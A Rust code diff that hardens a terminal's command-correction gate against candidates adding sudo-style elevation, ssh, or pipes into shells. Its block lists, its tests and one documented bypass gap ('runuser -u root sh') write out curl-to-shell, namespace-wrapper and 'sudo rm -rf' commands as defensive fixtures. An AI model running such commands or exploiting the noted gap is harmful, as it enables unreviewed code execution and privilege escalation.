@@ -300,6 +300,17 @@ impl CorrectionPolicy {
         self.context_sharing
     }
 
+    /// The name given to the probe's stdout reader thread.
+    ///
+    /// frost asserted on `format!("{policy:?}")` for want of this, which
+    /// coupled its test to a derived Debug format and still could not catch a
+    /// rename: the substring it looked for was the same constant it had just
+    /// passed in, so the assertion held whatever the policy did with it. The
+    /// other three shims had no way to check the name at all.
+    pub fn probe_thread_name(&self) -> &'static str {
+        self.probe_thread_name
+    }
+
     /// The witness [`correction_prompt`] demands, or `None` when the user has
     /// not consented to this failure's command, cwd and terminal output
     /// leaving the machine.
@@ -945,16 +956,16 @@ pub fn syntax_markers(command: &str) -> HashSet<&'static str> {
         .collect()
 }
 
-fn normalized_words(command: &str) -> HashSet<&str> {
-    command
-        .split_whitespace()
-        .map(|word| {
-            word.trim_matches(|character: char| {
-                !character.is_alphanumeric() && character != '_' && character != '-'
-            })
-        })
-        .filter(|word| !word.is_empty())
-        .collect()
+/// One command-line word with the punctuation a real command line carries
+/// trimmed off both ends, so `ls;` is `ls` and `'/bin/su'` is `bin/su`.
+///
+/// Interior characters are kept: a path spelling stays a path here and is
+/// reduced to its program name by [`stage_word_name`], which is a separate
+/// question from where the word sits.
+fn trimmed_word(word: &str) -> &str {
+    word.trim_matches(|character: char| {
+        !character.is_alphanumeric() && character != '_' && character != '-'
+    })
 }
 
 /// The one gate every candidate passes, whatever produced it.
@@ -998,19 +1009,32 @@ pub fn validate_candidate(
     {
         return Err(CorrectionRejection::AddsControlSyntax);
     }
-    let original_words = normalized_words(original);
-    let candidate_words = normalized_words(&candidate);
-    if ["sudo", "doas", "su"]
+    // Programs a stage would RUN, not words it merely contains. `/usr/bin/sudo`,
+    // `"sudo"` and `SUDO` all have to answer `sudo`, or a path spelling walks
+    // straight past a set lookup — but only in program position. Asking the
+    // question of every word instead reads `stat /usr/bin/sudo` as a command
+    // that already elevates, which then excuses a candidate that really does:
+    // the user's failed command need only *name* an elevation binary once for
+    // the gate to stay open for the rest of the exchange.
+    //
+    // The literal this replaces was also three of jagent's nine elevation
+    // programs, so `sudoedit`, `pkexec`, `runuser`, `run0`, `gosu` and
+    // `su-exec` were never looked for at all.
+    let original_programs = stage_programs(original);
+    let candidate_programs = stage_programs(&candidate);
+    if PRIVILEGE_DISPATCHERS
         .iter()
-        .any(|word| candidate_words.contains(word) && !original_words.contains(word))
+        .any(|name| candidate_programs.contains(*name) && !original_programs.contains(*name))
     {
         return Err(CorrectionRejection::AddsPrivilegeEscalation);
     }
     // `mosh` belongs here for the same reason as `ssh`: it opens an interactive
-    // session on a host the user never typed.
+    // session on a host the user never typed. Programs, not words, for both of
+    // the reasons the rule above needs them: `/usr/bin/ssh` must not walk past
+    // a set lookup, and `cat ~/.ssh/config` must not license one.
     if ["ssh", "mosh", "scp", "sftp"]
         .iter()
-        .any(|word| candidate_words.contains(word) && !original_words.contains(word))
+        .any(|name| candidate_programs.contains(*name) && !original_programs.contains(*name))
     {
         return Err(CorrectionRejection::AddsRemoteExecution);
     }
@@ -1078,19 +1102,61 @@ fn adds_pipe_to_interpreter(original: &str, candidate: &str) -> bool {
 /// exactly rather than keeping the older phrasing.
 const NETWORK_TO_INTERPRETER: &str = "piping network content into an interpreter";
 
-/// Programs that execute whatever is piped into them.
+/// The programs jagent's `is_privilege_dispatcher` treats as elevation.
 ///
-/// A test asserts that everything `jagent::safety::is_interpreter` recognises
-/// is on this list, so the two cannot drift apart unnoticed.
+/// Copied for the same reason as [`PIPE_INTERPRETERS`] — jagent keeps the
+/// predicate private — and pinned by a test that asks jagent about each name
+/// rather than about this list. A correction that introduces any of them turns
+/// a failed unprivileged command into a privileged one in an auto-focused,
+/// pre-filled field, which is a decision only the keyboard may make.
+const PRIVILEGE_DISPATCHERS: &[&str] = &[
+    "doas", "gosu", "pkexec", "run0", "runuser", "su", "su-exec", "sudo", "sudoedit",
+];
+
+/// Programs that execute whatever is piped into them *on their own*, with no
+/// further argument needed: `… | NAME` already hands the piped bytes to an
+/// interpreter.
+///
+/// `jagent::safety::is_interpreter` keeps the family's version of this table
+/// private, so the names have to be copied and a test has to keep the copy
+/// honest. That test derives its expectation from jagent rather than from this
+/// list — an earlier version iterated over this list, which structurally could
+/// not see a name jagent knew and this module did not, and the table was in
+/// fact 16 names short: the Linux personality wrappers (`unshare`, `nsenter`,
+/// and the `setarch` aliases `uname26`, `linux32`, `linux64`, `i386`, `i486`,
+/// `i586`, `i686`, `athlon`, `x86_64`) all drop the caller into a shell when
+/// run with no child argv, and `script` with no `-c` spawns an interactive one.
+/// A candidate turning `ls -l | head` into `ls -l | unshare -r sh` passed.
+///
+/// Programs that reach an interpreter only by dispatching a CHILD ARGV —
+/// `setarch x86_64 sh`, `systemd-run sh`, `capsh -- -c …`,
+/// `start-stop-daemon --start --exec /bin/sh` — deliberately do NOT belong
+/// here. They are [`STAGE_PREFIXES`], so the scan steps over them and judges
+/// the program they actually dispatch, which is what jagent's own dispatcher
+/// tables do.
+///
+/// `busybox` is the one name kept wider than jagent: `busybox` alone is an
+/// applet multiplexer whose first argument picks the applet, and `busybox sh`
+/// is a shell. jagent does not call bare `busybox` an interpreter; refusing it
+/// here is the safe direction, and the drift test names it as the single
+/// allowed disagreement rather than tolerating any disagreement.
 const PIPE_INTERPRETERS: &[&str] = &[
     "ash",
+    "athlon",
     "bash",
     "busybox",
     "csh",
     "dash",
     "fish",
+    "i386",
+    "i486",
+    "i586",
+    "i686",
     "ksh",
+    "linux32",
+    "linux64",
     "node",
+    "nsenter",
     "perl",
     "php",
     "powershell",
@@ -1099,17 +1165,67 @@ const PIPE_INTERPRETERS: &[&str] = &[
     "python2",
     "python3",
     "ruby",
+    "script",
     "sh",
     "tcsh",
+    "uname26",
+    "unshare",
+    "x86_64",
     "zsh",
 ];
 
 /// Leading words that say *how* to run a stage rather than being the program.
 /// `env FOO=1 sh`, `sudo -E bash`, `xargs sh -c` and `timeout 5 sh` are all
 /// pipes into a shell.
+///
+/// The namespace, personality, capability and service dispatchers here —
+/// `capsh`, `setarch`, `start-stop-daemon`, `systemd-run` — are the shape
+/// [`PIPE_INTERPRETERS`] refuses to model: on their own they run nothing, and
+/// what they run is named by a later word. Skipping them and judging that word
+/// is both stricter than stopping at the dispatcher (which is what this scan
+/// used to do, so `| setarch x86_64 sh` read as the unknown program `setarch`
+/// and was offered) and exactly what jagent does before consulting its own
+/// interpreter table. The privilege dispatchers are the full set jagent's
+/// `is_privilege_dispatcher` strips, for the same reason.
+///
+/// KNOWN LIMIT, pinned by
+/// `a_dispatcher_option_value_still_hides_the_interpreter_from_this_scan`:
+/// [`stage_interpreter`] skips words that *begin* with `-`, not the separate
+/// values some of these options take, so `| runuser -u root sh` resolves to the
+/// program `root` and is not seen through to the `sh`. Skipping the word after
+/// every option would be wrong in the other direction — `unshare -r sh` takes
+/// no value there, and `sh` would be skipped instead — and choosing correctly
+/// needs per-option arity, which is jagent's job, not this table's. The
+/// residual gap is narrow: `adds_pipe_to_interpreter` also asks jagent about
+/// the whole candidate, so any such pipeline that carries network provenance is
+/// still refused, and a candidate that *introduces* one of the nine elevation
+/// programs is refused outright by the privilege rule above.
 const STAGE_PREFIXES: &[&str] = &[
-    "command", "doas", "env", "exec", "ionice", "nice", "nohup", "pkexec", "setsid", "stdbuf",
-    "sudo", "time", "timeout", "unbuffer", "xargs",
+    "capsh",
+    "command",
+    "doas",
+    "env",
+    "exec",
+    "gosu",
+    "ionice",
+    "nice",
+    "nohup",
+    "pkexec",
+    "run0",
+    "runuser",
+    "setarch",
+    "setsid",
+    "start-stop-daemon",
+    "stdbuf",
+    "su",
+    "su-exec",
+    "sudo",
+    "sudoedit",
+    "systemd-run",
+    "time",
+    "timeout",
+    "unbuffer",
+    "xargs",
 ];
 
 /// The stage name recorded for a program this engine cannot resolve statically
@@ -1205,6 +1321,57 @@ fn stage_interpreter(stage: &str) -> Option<String> {
 fn is_assignment_word(word: &str) -> bool {
     word.split_once('=')
         .is_some_and(|(name, _)| !name.is_empty() && !name.contains('/'))
+}
+
+/// Every program the command would actually run, across all of its pipeline
+/// stages, reduced to a path-stripped, quote-stripped, case-folded name.
+///
+/// Each stage contributes the dispatchers the scan passes through plus the
+/// program it finally reaches, and nothing after that: `sudo apt install foo`
+/// runs both `sudo` and `apt`, while `stat /usr/bin/sudo` runs only `stat` —
+/// the path there is an argument it reads, not a program it runs. Keeping that
+/// distinction is the point. A rule that asked about every word would let any
+/// failed command excuse a correction simply by mentioning the watched program
+/// somewhere, and `ls -l /usr/bin/sudo` is an entirely ordinary thing to have
+/// just typed.
+///
+/// Unlike [`stage_interpreter`] this deliberately does NOT see through a
+/// dispatcher to a single terminal program: `sudo` is itself an answer here.
+fn stage_programs(command: &str) -> HashSet<String> {
+    let mut programs = HashSet::new();
+    for stage in pipeline_stages(command) {
+        // `pipeline_stages` splits on `|` only, but `;`, `&&`, `||` and `&` all
+        // begin a new command too, so the word after one is a program position
+        // again. Missing that would read `ls; sudo cat x` as the single program
+        // `ls` and never see the elevation the candidate introduced.
+        let mut program_position = true;
+        for raw in stage.split_whitespace() {
+            let separator_before = raw.starts_with([';', '&']);
+            let separator_after = raw.ends_with([';', '&']);
+            if separator_before {
+                program_position = true;
+            }
+            let word = trimmed_word(raw);
+            if !word.is_empty() && program_position {
+                // What merely describes the run is not a program, so keep
+                // looking; but a dispatcher that elevates IS one, and is the
+                // thing being looked for, so it is recorded and the scan
+                // continues past it to whatever it dispatches.
+                if !word.starts_with('-')
+                    && !is_assignment_word(word)
+                    && !word.chars().all(|character| character.is_ascii_digit())
+                {
+                    let name = stage_word_name(word);
+                    program_position = STAGE_PREFIXES.contains(&name.as_str());
+                    programs.insert(name);
+                }
+            }
+            if separator_after {
+                program_position = true;
+            }
+        }
+    }
+    programs
 }
 
 /// One stage word reduced to the program name it would execute: quotes and a
@@ -1335,6 +1502,33 @@ impl CorrectionCandidate {
             display_message: compact_one_line(&message, MAX_CORRECTION_MESSAGE_BYTES),
             evidence,
         })
+    }
+
+    /// Build a candidate from a fixture pair, for shim tests.
+    ///
+    /// The four apps each render and act on a *verified* candidate differently
+    /// — direct run against insert-for-review — and could not reach that branch
+    /// hermetically without a network reply, so three of them did not test it
+    /// at all. This is the escape hatch, and it is `#[doc(hidden)]` rather than
+    /// behind a cargo feature because this crate ships no features and the apps
+    /// pin it by git rev, which would make a feature invisible to their
+    /// dev-dependency graph.
+    ///
+    /// `#[doc(hidden)]` hides an item from rustdoc; it does not stop anything
+    /// from calling it. So this must not be a way to mint the proof the type
+    /// exists to carry: it takes the same pair the production path takes and
+    /// runs the real [`validate_candidate`] gate, and only the evidence — which
+    /// a shim needs to choose in order to reach its verified branch — is
+    /// supplied rather than probed. A fixture that names an unsafe command is
+    /// rejected here exactly as a model reply would be.
+    #[doc(hidden)]
+    pub fn for_tests(
+        original: Original<'_>,
+        proposed: Candidate<'_>,
+        message: &str,
+        evidence: CorrectionEvidence,
+    ) -> Result<Self, CorrectionRejection> {
+        Self::new(validate_candidate(original, proposed)?, message, evidence)
     }
 
     /// The proposal itself, already through [`validate_candidate`].
@@ -1982,14 +2176,18 @@ pub fn resolve_correction_blocking(
 /// long-command toast all refuse an untrusted completion; only its correction
 /// surface accepted one.
 #[derive(Clone, Debug, PartialEq, Eq)]
-pub struct CompletionFacts {
+pub struct CompletionFacts<'a> {
     pub command: String,
     /// `None` means the shell reported no status. Not a failure signal.
     pub exit_code: Option<i32>,
-    /// The finished block's output as the app holds it. Pass it whole:
-    /// [`should_start`] reduces it to a [`sample_output`] head/tail before
-    /// anything classifies it or keeps it, so a shim must not sample first.
-    pub output: String,
+    /// The finished block's output as the app holds it, BORROWED. Pass it
+    /// whole: [`should_start`] reduces it to a [`sample_output`] head/tail
+    /// before anything classifies it or keeps it, so a shim must not sample
+    /// first — and must not copy first either. This field was a `String`, so
+    /// every trusted completion cloned a whole finished block (an app's entire
+    /// captured-output budget) to hand it to a function that only ever borrows
+    /// it and immediately re-derives a bounded sample from it.
+    pub output: &'a str,
     pub cwd: Option<String>,
     /// The command ran against a remote target, so local probes prove nothing.
     pub remote: bool,
@@ -2050,7 +2248,7 @@ impl CorrectionRequest {
 /// `--safe-mode` flag with different meanings, and ember and frost have no such
 /// concept, so hardcoding anvil's five-way gate here would be one app's policy
 /// imposed on three.
-pub fn should_start(enabled: bool, facts: CompletionFacts) -> Option<CorrectionRequest> {
+pub fn should_start(enabled: bool, facts: CompletionFacts<'_>) -> Option<CorrectionRequest> {
     if !enabled || facts.agent_issued || !facts.trusted_completion {
         return None;
     }
@@ -2065,7 +2263,7 @@ pub fn should_start(enabled: bool, facts: CompletionFacts) -> Option<CorrectionR
     // lowercase allocation on the UI thread, and clones the entire scrollback
     // into the request), while a shim pre-sampling to be safe got its sample
     // sampled again by `correction_prompt`, eliding real content a second time.
-    let output = sample_output(&facts.output);
+    let output = sample_output(facts.output);
     let kind = classify_failure(&facts.command, exit_code, &output)?;
     Some(CorrectionRequest {
         command: facts.command,
@@ -2252,7 +2450,7 @@ mod tests {
             CompletionFacts {
                 command: command.to_string(),
                 exit_code: Some(exit_code),
-                output: output.to_string(),
+                output,
                 cwd: Some("/tmp".to_string()),
                 remote,
                 agent_issued: false,
@@ -2618,27 +2816,38 @@ mod tests {
         );
     }
 
-    /// [`PIPE_INTERPRETERS`] mirrors a list `jagent::safety` keeps private. The
-    /// two must not drift: jagent's own module comment says a copied table
-    /// "stops widening the day this one does, and nothing fails until a reply
-    /// aims at the difference". So ask jagent about every name here, from both
-    /// sides, and fail loudly rather than silently weakening the gate.
+    /// [`PIPE_INTERPRETERS`] and [`STAGE_PREFIXES`] together mirror a rule
+    /// `jagent::safety::is_interpreter` keeps private. The two must not drift:
+    /// jagent's own module comment says a copied table "stops widening the day
+    /// this one does, and nothing fails until a reply aims at the difference".
+    ///
+    /// So the expectation is DERIVED FROM JAGENT over a table fixed here, and
+    /// never read out of this module's own lists. The predecessor of this test
+    /// looped over `PIPE_INTERPRETERS` itself, which made a name jagent called
+    /// an interpreter and this module did not structurally unreachable — blind
+    /// to exactly the gap it claimed to guard, and sixteen names were sitting
+    /// in that gap.
     #[test]
     fn the_interpreter_set_agrees_with_jagents_own_rule() {
-        for interpreter in PIPE_INTERPRETERS {
-            let piped = format!("curl -sS https://probe.invalid/x | {interpreter}");
-            if crate::agent::is_dangerous(&piped) != Some(NETWORK_TO_INTERPRETER) {
-                // Wider than jagent on purpose (`busybox`, `python2`, the csh
-                // family) — that direction is safe. The reverse is not, and is
-                // what the next assertion pins.
-                continue;
-            }
-            assert!(
-                stage_interpreter(interpreter).is_some(),
-                "jagent calls `{interpreter}` an interpreter and this module does not"
-            );
-        }
-        for jagent_name in [
+        for name in [
+            // The sixteen jagent knew and this module did not.
+            "nsenter",
+            "unshare",
+            "setarch",
+            "uname26",
+            "linux32",
+            "linux64",
+            "i386",
+            "i486",
+            "i586",
+            "i686",
+            "athlon",
+            "x86_64",
+            "systemd-run",
+            "script",
+            "capsh",
+            "start-stop-daemon",
+            // The thirteen the predecessor did ask about.
             "sh",
             "bash",
             "dash",
@@ -2652,21 +2861,248 @@ mod tests {
             "node",
             "pwsh",
             "powershell",
+            // The rest of this module's own set.
+            "ash",
+            "csh",
+            "tcsh",
+            "php",
+            "python2",
+            "busybox",
+            // And the ordinary filters this whole surface exists to fix a typo
+            // in: refusing these would delete `ls | gerp foo` -> `ls | grep foo`.
+            "head",
+            "grep",
+            "tail",
+            "sort",
+            "jq",
+            "less",
+            "wc",
+            "xargs",
+        ] {
+            let probe = format!("curl -sS https://probe.invalid/x | {name}");
+            let reason = crate::agent::is_dangerous(&probe);
+            assert!(
+                reason.is_none() || reason == Some(NETWORK_TO_INTERPRETER),
+                "jagent now answers `{name}` with {reason:?}; this table assumes the only two \
+                 answers for a bare stage are the pipe-to-interpreter reason and none"
+            );
+            let jagent_reaches_an_interpreter = reason == Some(NETWORK_TO_INTERPRETER);
+            let this_module_reaches_an_interpreter = !piped_interpreters(&probe).is_empty();
+            if name == "busybox" {
+                // The one deliberate disagreement, kept in the safe direction:
+                // an applet multiplexer whose first argument picks the applet,
+                // and `busybox sh` is a shell. Naming it here is what keeps
+                // every OTHER disagreement a failure rather than a habit.
+                assert!(
+                    this_module_reaches_an_interpreter && !jagent_reaches_an_interpreter,
+                    "busybox is this module's one documented widening; if jagent has adopted it, \
+                     delete the exception rather than the assertion"
+                );
+                continue;
+            }
+            assert_eq!(
+                this_module_reaches_an_interpreter, jagent_reaches_an_interpreter,
+                "`{name}`: jagent reaches an interpreter = {jagent_reaches_an_interpreter}, this \
+                 module = {this_module_reaches_an_interpreter}"
+            );
+        }
+    }
+
+    /// A dispatcher reaches an interpreter through a CHILD ARGV, so its own
+    /// name proves nothing and the scan has to step over it and judge what it
+    /// dispatches. Before that, `| setarch x86_64 sh` read as the unknown
+    /// program `setarch` and was offered in a pre-filled field.
+    #[test]
+    fn a_candidate_may_not_reach_an_interpreter_through_a_dispatcher() {
+        for reaching in [
+            "unshare -r sh",
+            "nsenter -t 1 -m sh",
+            "systemd-run sh",
+            "setarch x86_64 sh",
+            "capsh -- -c 'sh'",
+            "start-stop-daemon --start --exec /bin/sh",
+            "script -qc sh /dev/null",
+            "uname26 sh",
+            "linux32 /bin/bash",
+        ] {
+            // The original already pipes, so no new syntax marker appears and
+            // `adds_pipe_to_interpreter` is the only rule left standing.
+            assert_eq!(
+                validate_candidate(
+                    Original("ls -l | head -20"),
+                    Candidate(&format!("ls -l | {reaching}"))
+                ),
+                Err(CorrectionRejection::AddsPipeToInterpreter),
+                "{reaching}"
+            );
+            // With no pipe in the original the refusal must still be total,
+            // whichever rule reaches it first.
+            assert!(
+                validate_candidate(Original("ls -l"), Candidate(&format!("ls -l | {reaching}")))
+                    .is_err(),
+                "{reaching}"
+            );
+        }
+        // Stepping over a dispatcher must not start refusing ordinary filters.
+        assert_eq!(
+            validate_candidate(
+                Original("ls -l | tial -20"),
+                Candidate("ls -l | timeout 5 tail -20")
+            )
+            .as_deref(),
+            Ok("ls -l | timeout 5 tail -20")
+        );
+    }
+
+    /// The shape the list above deliberately does not contain, pinned so the
+    /// limit is a fact rather than an assumption.
+    ///
+    /// [`stage_interpreter`] skips words that begin with `-`, not the separate
+    /// value an option may take, so a dispatcher option with a detached value
+    /// stops the scan on that value. `runuser -u root sh` resolves to the
+    /// program `root`. Fixing it needs per-option arity — skipping the word
+    /// after every option would swallow the `sh` in `unshare -r sh`, which the
+    /// test above requires to be caught — so this records the gap instead of
+    /// pretending it is closed. Flip these assertions when the scan learns
+    /// arity.
+    #[test]
+    fn a_dispatcher_option_value_still_hides_the_interpreter_from_this_scan() {
+        assert_eq!(stage_interpreter("runuser -u root sh"), None);
+        assert_eq!(stage_interpreter("gosu -u root sh"), None);
+        // Not every dispatcher-shaped word is affected: the personality and
+        // namespace wrappers are in `PIPE_INTERPRETERS` in their own right,
+        // because a bare one drops you into a shell, so the scan stops on them
+        // and never has to reach their operand.
+        assert_eq!(
+            stage_interpreter("nsenter --target 1 sh").as_deref(),
+            Some("nsenter")
+        );
+        // The dispatcher itself is still caught by the privilege rule whenever
+        // the candidate introduces it, which is what keeps the gap narrow.
+        assert_eq!(
+            validate_candidate(
+                Original("ls -l | head -20"),
+                Candidate("ls -l | runuser -u root sh")
+            ),
+            Err(CorrectionRejection::AddsPrivilegeEscalation)
+        );
+        // And network provenance is jagent's question, not this scan's, so the
+        // pipeline that actually matters is still refused.
+        assert_eq!(
+            validate_candidate(
+                Original("curl -sS https://example.invalid/x | head -20"),
+                Candidate("curl -sS https://example.invalid/x | runuser -u root sh")
+            ),
+            Err(CorrectionRejection::AddsPrivilegeEscalation)
+        );
+    }
+
+    /// jagent's `is_privilege_dispatcher` names nine programs; this gate named
+    /// three, and compared raw normalized words, so a directory prefix was
+    /// enough on top of that.
+    #[test]
+    fn a_candidate_may_not_introduce_any_privilege_dispatcher() {
+        // Iterate a table fixed HERE, never `PRIVILEGE_DISPATCHERS` itself: a
+        // loop over the constant under test can only ever confirm the names it
+        // already contains, and is structurally blind to the one thing worth
+        // catching — a program jagent calls elevation that this module has not
+        // heard of. jagent is the oracle for the expectation; this list only
+        // has to be wide enough to include whatever it grows next.
+        for name in [
+            "sudo", "sudoedit", "doas", "pkexec", "su", "runuser", "run0", "gosu", "su-exec",
+            // Plausible neighbours jagent does not (yet) call elevation. If it
+            // starts, the assertion below turns red here rather than silently
+            // in production.
+            "please", "op", "calife", "super",
+            // Controls: ordinary programs that must stay correctable.
+            "apt", "git", "cargo", "ls",
+        ] {
+            let elevates = crate::agent::is_dangerous(&format!("{name} whoami"))
+                == Some("uses elevated privileges");
+            let refused = validate_candidate(
+                Original("apt install ffmpeg"),
+                Candidate(&format!("{name} apt install ffmpeg")),
+            ) == Err(CorrectionRejection::AddsPrivilegeEscalation);
+            assert_eq!(
+                refused, elevates,
+                "jagent and this module disagree about `{name}`: jagent says \
+                 elevation={elevates}, this module refuses={refused}"
+            );
+        }
+        // The same program spelled differently is the same program.
+        for spelling in ["/usr/bin/sudo", "\"sudo\"", "SUDO", "'/bin/su'"] {
+            assert_eq!(
+                validate_candidate(
+                    Original("apt install ffmpeg"),
+                    Candidate(&format!("{spelling} apt install ffmpeg"))
+                ),
+                Err(CorrectionRejection::AddsPrivilegeEscalation),
+                "{spelling}"
+            );
+        }
+        // A privilege word the original already carries is the user's own
+        // decision, and correcting the rest of that line stays allowed.
+        assert_eq!(
+            validate_candidate(
+                Original("sudo apt install ffmpg"),
+                Candidate("sudo apt install ffmpeg")
+            )
+            .as_deref(),
+            Ok("sudo apt install ffmpeg")
+        );
+        // ...and it is the original RUNNING one that excuses the candidate,
+        // never the original merely naming one. Reading a file called `sudo`
+        // is an ordinary thing to have just typed, and must not hold the gate
+        // open for the rest of the exchange.
+        for original in [
+            "stat /usr/bin/sudo",
+            "ls -l /usr/bin/sudo",
+            "cat /etc/pam.d/su",
+            "md5sum /bin/su",
+            "echo SUDO",
         ] {
             assert_eq!(
-                crate::agent::is_dangerous(&format!(
-                    "curl -sS https://probe.invalid/x | {jagent_name}"
-                )),
-                Some(NETWORK_TO_INTERPRETER),
-                "jagent no longer flags `{jagent_name}`; NETWORK_TO_INTERPRETER may have changed"
+                validate_candidate(
+                    Original(original),
+                    Candidate("sudo rm -rf /var/cache/apt/archives")
+                ),
+                Err(CorrectionRejection::AddsPrivilegeEscalation),
+                "`{original}` names an elevation program without running one, \
+                 so it cannot excuse a candidate that runs one"
             );
-            assert!(PIPE_INTERPRETERS.contains(&jagent_name), "{jagent_name}");
         }
-        // Ordinary filters are not interpreters, or the rule would refuse every
-        // pipeline correction.
-        for filter in ["head", "grep", "tail", "sort", "jq", "less", "wc"] {
-            assert!(stage_interpreter(filter).is_none(), "{filter}");
+        // The path spelling still excuses itself when the original really did
+        // elevate: this rule compares programs, so both sides normalise.
+        assert_eq!(
+            validate_candidate(
+                Original("/usr/bin/sudo apt install ffmpg"),
+                Candidate("sudo apt install ffmpeg")
+            )
+            .as_deref(),
+            Ok("sudo apt install ffmpeg")
+        );
+        // A `;`, `&&`, `||` or `&` starts a new command, so the word after one
+        // is a program position too. Reading only the first program of each
+        // pipe-separated stage would miss the elevation entirely.
+        for separator in [";", "&&", "||", "&"] {
+            assert_eq!(
+                validate_candidate(
+                    Original(&format!("ls -l {separator} cat notes.txt")),
+                    Candidate(&format!("ls -l {separator} sudo cat notes.txt"))
+                ),
+                Err(CorrectionRejection::AddsPrivilegeEscalation),
+                "{separator}"
+            );
         }
+        // ...and a remote-execution program is normalised the same way, on
+        // both sides: naming a path is not running one.
+        assert_eq!(
+            validate_candidate(
+                Original("cat /home/u/.ssh/config"),
+                Candidate("/usr/bin/ssh build-host")
+            ),
+            Err(CorrectionRejection::AddsRemoteExecution)
+        );
     }
 
     /// forge routed deterministic candidates through a gate with none of the
@@ -2942,7 +3378,7 @@ mod tests {
             CompletionFacts {
                 command: "gti status".to_string(),
                 exit_code: Some(1),
-                output: output.clone(),
+                output: &output,
                 cwd: Some("/tmp".to_string()),
                 remote: false,
                 agent_issued: false,
@@ -3137,6 +3573,61 @@ mod tests {
 
         proposal.set_feedback(Some("prompt not ready".to_string()));
         assert_eq!(proposal.feedback(), Some("prompt not ready"));
+    }
+
+    /// The two shapes the four shims could not reach from their own test
+    /// suites: the probe thread name a policy actually carries, and a verified
+    /// candidate built without a network reply.
+    #[test]
+    fn the_shim_facing_accessor_and_fixture_constructor_are_reachable() {
+        let policy = CorrectionPolicy::new(
+            LocalEvidence::Unavailable,
+            ContextSharing::Withheld,
+            "jterm-core-correction-probe",
+        );
+        assert_eq!(policy.probe_thread_name(), "jterm-core-correction-probe");
+
+        let candidate = CorrectionCandidate::for_tests(
+            Original("apt-get install ffmpg"),
+            Candidate("apt-get install ffmpeg"),
+            "APT contains `ffmpeg`.",
+            CorrectionEvidence::AptIndex,
+        )
+        .expect("the fixture constructor accepts what the production path accepts");
+        assert_eq!(candidate.command(), "apt-get install ffmpeg");
+        assert!(candidate.evidence().is_verified());
+        // The message still goes through the same sanitiser, so a fixture
+        // cannot smuggle a spelling the real constructor would have flattened.
+        let spoofed = CorrectionCandidate::for_tests(
+            Original("ls"),
+            Candidate("ls -l"),
+            "one\u{202e}two",
+            CorrectionEvidence::AiUnverified,
+        )
+        .unwrap();
+        assert!(!spoofed.display_message().contains('\u{202e}'));
+        // And the gate is the real one: `#[doc(hidden)]` hides the entry point
+        // from rustdoc, it does not stop a caller, so a fixture must not be a
+        // way to mint a verified candidate for a command `validate_candidate`
+        // would have refused.
+        assert_eq!(
+            CorrectionCandidate::for_tests(
+                Original("apt install ffmpeg"),
+                Candidate("sudo apt install ffmpeg"),
+                "run it as root",
+                CorrectionEvidence::ExecutablePath,
+            ),
+            Err(CorrectionRejection::AddsPrivilegeEscalation)
+        );
+        assert_eq!(
+            CorrectionCandidate::for_tests(
+                Original("ls -l | head -20"),
+                Candidate("ls -l | sh"),
+                "pipe it to a shell",
+                CorrectionEvidence::ExecutablePath,
+            ),
+            Err(CorrectionRejection::AddsPipeToInterpreter)
+        );
     }
 
     /// The card labels its primary action from `run_allowed` and then submits
@@ -3423,7 +3914,7 @@ mod tests {
         let facts = || CompletionFacts {
             command: "gti status".to_string(),
             exit_code: Some(127),
-            output: "bash: gti: command not found".to_string(),
+            output: "bash: gti: command not found",
             cwd: Some("/tmp".to_string()),
             remote: false,
             agent_issued: false,
@@ -3463,7 +3954,7 @@ mod tests {
             CompletionFacts {
                 command: "cargo test".to_string(),
                 exit_code: Some(101),
-                output: "ordinary test failure".to_string(),
+                output: "ordinary test failure",
                 ..facts()
             }
         )
